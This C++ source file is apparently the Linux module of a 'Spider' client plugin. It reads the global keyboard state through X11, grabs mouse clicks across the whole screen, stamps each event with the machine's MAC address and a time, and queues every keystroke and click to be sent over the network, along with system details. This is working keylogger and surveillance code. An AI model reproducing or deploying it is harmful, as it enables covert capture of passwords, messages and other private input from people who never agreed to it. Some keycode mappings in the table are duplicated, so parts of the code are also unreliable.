#if defined __linux__

#include "SpiderPlugin.h"
#include "MacAddr.h"
#include <string>
#include <fstream>
#include <limits>

// System
#include <array>
#include <algorithm>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cstdarg>
#include <ctime>
#include <cstring>

// X11
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/cursorfont.h>

namespace spider
{
  namespace client
  {
    namespace library
    {

      std::map<std::uint32_t, KeyboardKey> SpiderPlugin::m_linuxKeyboardMap = {
          {0x16, KeyboardKey::KB_BACKSPACE},
          {0x17, KeyboardKey::KB_TAB},
          {0x24, KeyboardKey::KB_ENTER},
          {0x4A, KeyboardKey::KB_CAPSLOCK},
          {0x09, KeyboardKey::KB_ESCAPE},
          {0x49, KeyboardKey::KB_SPACE},
          {0x70, KeyboardKey::KB_PAGEUP},
          {0x75, KeyboardKey::KB_PAGEDOWN},
          {0x73, KeyboardKey::KB_END},
          {0x6E, KeyboardKey::KB_HOME},
          {0x71, KeyboardKey::KB_ARROW_LEFT},
          {0x6F, KeyboardKey::KB_ARROW_UP},
          {0x72, KeyboardKey::KB_ARROW_RIGHT},
          {0x74, KeyboardKey::KB_ARROW_DOWN},
          {0x77, KeyboardKey::KB_DELETE},
          {0x13, KeyboardKey::KB_0},
          {0x0A, KeyboardKey::KB_1},
          {0x0B, KeyboardKey::KB_2},
          {0x0C, KeyboardKey::KB_3},
          {0x0D, KeyboardKey::KB_4},
          {0x0E, KeyboardKey::KB_5},
          {0x0F, KeyboardKey::KB_6},
          {0x10, KeyboardKey::KB_7},
          {0x11, KeyboardKey::KB_8},
          {0x12, KeyboardKey::KB_9},
          {0x18, KeyboardKey::KB_A_MINUS},
          {0x38, KeyboardKey::KB_B_MINUS},
          {0x36, KeyboardKey::KB_C_MINUS},
          {0x28, KeyboardKey::KB_D_MINUS},
          {0x1A, KeyboardKey::KB_E_MINUS},
          {0x29, KeyboardKey::KB_F_MINUS},
          {0x2A, KeyboardKey::KB_G_MINUS},
          {0x2B, KeyboardKey::KB_H_MINUS},
          {0x1F, KeyboardKey::KB_I_MINUS},
          {0x2C, KeyboardKey::KB_J_MINUS},
          {0x2D, KeyboardKey::KB_K_MINUS},
          {0x2E, KeyboardKey::KB_L_MINUS},
          {0x2F, KeyboardKey::KB_M_MINUS},
          {0x39, KeyboardKey::KB_N_MINUS},
          {0x20, KeyboardKey::KB_O_MINUS},
          {0x21, KeyboardKey::KB_P_MINUS},
          {0x26, KeyboardKey::KB_Q_MINUS},
          {0x1B, KeyboardKey::KB_R_MINUS},
          {0x27, KeyboardKey::KB_S_MINUS},
          {0x1C, KeyboardKey::KB_T_MINUS},
          {0x1E, KeyboardKey::KB_U_MINUS},
          {0x37, KeyboardKey::KB_V_MINUS},
          {0x34, KeyboardKey::KB_W_MINUS},
          {0x35, KeyboardKey::KB_X_MINUS},
          {0x1D, KeyboardKey::KB_Y_MINUS},
          {0x19, KeyboardKey::KB_Z_MINUS},
          // {VK_LWIN, KeyboardKey::KB_LCMD},
          // {VK_RWIN, KeyboardKey::KB_RCMD},
          // {VK_NUMPAD0, KeyboardKey::KB_0},
          // {VK_NUMPAD1, KeyboardKey::KB_1},
          // {VK_NUMPAD2, KeyboardKey::KB_2},
          // {VK_NUMPAD3, KeyboardKey::KB_3},
          // {VK_NUMPAD4, KeyboardKey::KB_4},
          // {VK_NUMPAD5, KeyboardKey::KB_5},
          // {VK_NUMPAD6, KeyboardKey::KB_6},
          // {VK_NUMPAD7, KeyboardKey::KB_7},
          // {VK_NUMPAD8, KeyboardKey::KB_8},
          // {VK_NUMPAD9, KeyboardKey::KB_9},
          {0x33, KeyboardKey::KB_ASTERISK},
          // {VK_ADD, KeyboardKey::KB_PLUS},
          // {VK_SUBTRACT, KeyboardKey::KB_MINUS},
          // {VK_DIVIDE, KeyboardKey::KB_SLASH},
          {0x43, KeyboardKey::KB_FN1},
          {0x44, KeyboardKey::KB_FN2},
          {0x45, KeyboardKey::KB_FN3},
          {0x46, KeyboardKey::KB_FN4},
          {0x47, KeyboardKey::KB_FN5},
          {0x48, KeyboardKey::KB_FN6},
          {0x49, KeyboardKey::KB_FN7},
          {0x4A, KeyboardKey::KB_FN8},
          {0x4B, KeyboardKey::KB_FN9},
          {0x4C, KeyboardKey::KB_FN10},
          {0x5F, KeyboardKey::KB_FN11},
          {0x60, KeyboardKey::KB_FN12},
          // {VK_F13, KeyboardKey::KB_FN13},
          // {VK_F14, KeyboardKey::KB_FN14},
          // {VK_F15, KeyboardKey::KB_FN15},
          // {VK_F16, KeyboardKey::KB_FN16},
          // {VK_F17, KeyboardKey::KB_FN17},
          // {VK_F18, KeyboardKey::KB_FN18},
          // {VK_F19, KeyboardKey::KB_FN19},
          // {VK_F20, KeyboardKey::KB_FN20},
          // {VK_F21, KeyboardKey::KB_FN21},
          // {VK_F22, KeyboardKey::KB_FN22},
          // {VK_F23, KeyboardKey::KB_FN23},
          // {VK_F24, KeyboardKey::KB_FN24},
          // {VK_NUMLOCK, KeyboardKey::KB_NUMLOCK},
          // {VK_SCROLL, KeyboardKey::KB_SCROLL},
          {0x32, KeyboardKey::KB_LSHIFT},
          {0x3e, KeyboardKey::KB_RSHIFT},
          {0x25, KeyboardKey::KB_LCTRL},
          {0x69, KeyboardKey::KB_RCTRL},
          {0x3b, KeyboardKey::KB_SEMICOLON}, // : if shift
          // {VK_OEM_PLUS, KeyboardKey::KB_PLUS},
          {0x3a, KeyboardKey::KB_COMMA} // < if shift
          // {VK_OEM_MINUS, KeyboardKey::KB_MINUS},// _ if shift
          // {VK_OEM_PERIOD, KeyboardKey::KB_DOT}, // > if shift
          // {VK_OEM, KeyboardKey::KB_SLASH},  // ? if shift
          // {VK_OEM_3, KeyboardKey::KB_BACKQUOTE},// ~ if shift
          // {VK_OEM_4, KeyboardKey::KB_LEFTBRACKET},  // { if shift
          // {VK_OEM_5, KeyboardKey::KB_BACKSLASH},// | if shift
          // {VK_OEM_6, KeyboardKey::KB_RIGHTBRACKET}, // } if shift
          // {VK_OEM_7, KeyboardKey::KB_SIMPLEQUOTE}   // " if shift
      };

      Display *_Xdisplay = NULL;
      Window   _Xroot_win = 0;

      bool SpiderPlugin::initLinux()
      {
	// Get informations
        getInfosLinux();
        // Mac Addr
        MacAddress::get(m_macAddr);
        
	// Init Window and Screen
	if (!(_Xdisplay = XOpenDisplay(NULL)))
	  return false;
	Screen *screen = XScreenOfDisplay(_Xdisplay, DefaultScreen(_Xdisplay));
	if (!screen)
	  return false;
	_Xroot_win = RootWindow(_Xdisplay, XScreenNumberOfScreen(screen));
	if (!_Xroot_win)
          return false;
	return true;
      }

      bool SpiderPlugin::deinitLinux()
      {
	/* close connection to server */
	XDestroyWindow(_Xdisplay, _Xroot_win);
	XCloseDisplay(_Xdisplay);
	return false;
      }

      void SpiderPlugin::getInfosLinux()
      {
#if INTPTR_MAX == INT64_MAX
	m_infos.pArch = ProcArchitecture::AMD64; // Assume x86_64
	m_infos.arch = Architecture::BITS_64;
#elif INTPTR_MAX == INT32_MAX
	m_infos.pArch = ProcArchitecture::x86; // Assume x86
	m_infos.arch = Architecture::BITS_32;
#endif
	m_infos.os = OperatingSystem::Linux;
	m_infos.pageSize = getPageSize();
	m_infos.nbProc = getNumberProcessors();
	m_infos.ram = getRAMLinux();
      }

      std::uint64_t SpiderPlugin::getRAMLinux() const
      {
	std::string   token;
	std::ifstream file("/proc/meminfo");

	if (file.is_open())
	  {
	    while (file >> token)
	      {
		if (token == "MemTotal:")
		  {
		    std::uint64_t mem;
		    if (file >> mem)
		      {
			return mem / (1024);
		      }
		    break;
		  }
		// ignore rest of the line
		file.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
	      }
	  }
	// Nothing found
	return 0;
      }

      bool SpiderPlugin::hookKeyboardLinux() const
      {
	return true;
      }

      bool SpiderPlugin::unHookKeyboardLinux() const
      {
	// Nothing
	return false;
      }

      bool SpiderPlugin::hookMouseLinux() const
      {
	// Left Click
	XGrabButton(_Xdisplay, Button1, AnyModifier,
	            DefaultRootWindow(_Xdisplay), True,
	            ButtonPressMask | ButtonReleaseMask, GrabModeSync,
	            GrabModeSync, None, None);
	// Right Click
	XGrabButton(_Xdisplay, Button3, AnyModifier,
	            DefaultRootWindow(_Xdisplay), True,
	            ButtonPressMask | ButtonReleaseMask, GrabModeSync,
	            GrabModeSync, None, None);
	return true;
      }

      bool SpiderPlugin::unHookMouseLinux() const
      {
	XUngrabButton(_Xdisplay, Button1, AnyModifier, _Xroot_win);
        XUngrabButton(_Xdisplay, Button3, AnyModifier, _Xroot_win);
	return false;
      }

      void SpiderPlugin::runLinux() const
      {
        // Keyboard
        if (this->m_keyboardHook) {

                spider::client::SystemMsg msg;
                
                static char szKey[32];
                static char szKeyOld[32] = { 0 };
        
                static char szBit = 0;
                static char szBitOld = 0;
                static int  iCheck = 0;
        
                static char  szKeysym = 0;
                static char *szKeyString = NULL;
        
                int iKeyCode = 0;
                int iReverToReturn = 0;

                XQueryKeymap(_Xdisplay, szKey);
                if (memcmp(szKey, szKeyOld, 32))
                {
                        for (size_t i = 0; i < sizeof(szKey); i++)
                        {
                                szBit = szKey[i];
                                szBitOld = szKeyOld[i];
                                iCheck = 1;

                                for (int j = 0; j < 8; j++)
                                {
                                if ((szBit & iCheck) && !(szBitOld & iCheck))
                                {
                                        iKeyCode = i * 8 + j;

                                        msg.sys.type = SystemMsgType::EventKeyboard;
                                        msg.sys.time =
                                        static_cast<std::uint64_t>(std::time(nullptr));
                                        std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
                                        msg.sys.event.state = SystemMsgEventState::Down;

                                        if (m_linuxKeyboardMap.find(iKeyCode) ==
                                        m_linuxKeyboardMap.end())
                                        {
                                        msg.sys.event.key = static_cast<std::uint32_t>(
                                                KeyboardKey::KB_NONE);
                                        }
                                        else
                                        {
                                        msg.sys.event.key = static_cast<std::uint32_t>(
                                                m_linuxKeyboardMap[iKeyCode]);
                                        }
                                        msg.sys.event.upper = false;
                                        SpiderPlugin::m_sendToNetwork->push(msg);

                                        XGetInputFocus(_Xdisplay, &_Xroot_win,
                                                &iReverToReturn);
                                }
                                iCheck <<= 1;
                                }
                        }
                }
                memcpy(szKeyOld, szKey, 32);
        }

        // Mouse
        if (this->m_mouseHook) {
                while (XPending(_Xdisplay) > 0)
                        {
                        spider::client::SystemMsg msg;
                        XEvent report;
                                
                        XNextEvent(_Xdisplay, &report);
                        XAllowEvents(_Xdisplay, ReplayPointer, CurrentTime);

                        if (report.type == ButtonPress)
                        {
                        bool getPos = false;

                        msg.sys.type = SystemMsgType::EventMouse;
                        msg.sys.time = static_cast<std::uint64_t>(std::time(nullptr));
                        std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
                        msg.sys.event.upper = 0;

                        switch (report.xbutton.button)
                                {
                                case 1: // LEFT CLICK
                                getPos = true;
                                msg.sys.event.key =
                                static_cast<std::uint32_t>(MouseButton::ButtonLeft);
                                msg.sys.event.state = SystemMsgEventState::Down;
                                break;
                                case 3: // RIGHT CLICK
                                getPos = true;
                                msg.sys.event.key =
                                static_cast<std::uint32_t>(MouseButton::ButtonRight);
                                msg.sys.event.state = SystemMsgEventState::Up;
                                break;
                                }
                        if (getPos)
                                {
                                msg.sys.event.posX =
                                static_cast<std::uint32_t>(report.xbutton.x);
                                msg.sys.event.posY =
                                static_cast<std::uint32_t>(report.xbutton.y);
                                }
                        SpiderPlugin::m_sendToNetwork->push(msg);
                        }
                }
        }
}
    }
  }
}
#endif
